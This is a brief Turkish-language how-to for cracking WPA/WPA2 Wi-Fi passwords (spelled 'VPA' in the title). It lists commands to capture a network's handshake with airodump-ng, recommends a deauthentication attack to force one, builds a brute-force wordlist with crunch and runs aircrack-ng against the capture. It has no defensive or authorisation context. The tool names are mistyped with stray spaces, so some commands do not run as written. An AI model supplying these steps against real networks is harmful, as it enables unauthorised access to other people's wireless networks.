# VPA-VPA2 Şifre Kırma

## 1.Handshake Yakalama
``` airodump -ng --channel X --bssid XX:XX:XX:XX:XX:XX --write handshake-file wlan0mon```

* channel: Ağın çalıştığı kanal
* bssid: Ağın MAC adresi
* write: Yakalanan handshake'in nereye kayıt edileceği

**! Kolayca handshake yakalamak için ufak paketli deauth saldırı yapılabilir**

## 2.Wordlist Oluşturma
``` crunch 6 10 0123456789abcdefgh -o passwrd.txt``` içinde "0123456789abcdefgh" geçen min 6 maks 10
haneli şifre kombinasyonlarının olduğu passwrd isimli wordlist oluşturur

## 3.Şifre Kırma
``` aircrack -ng handshake-file.cap -w passwrd.txt```
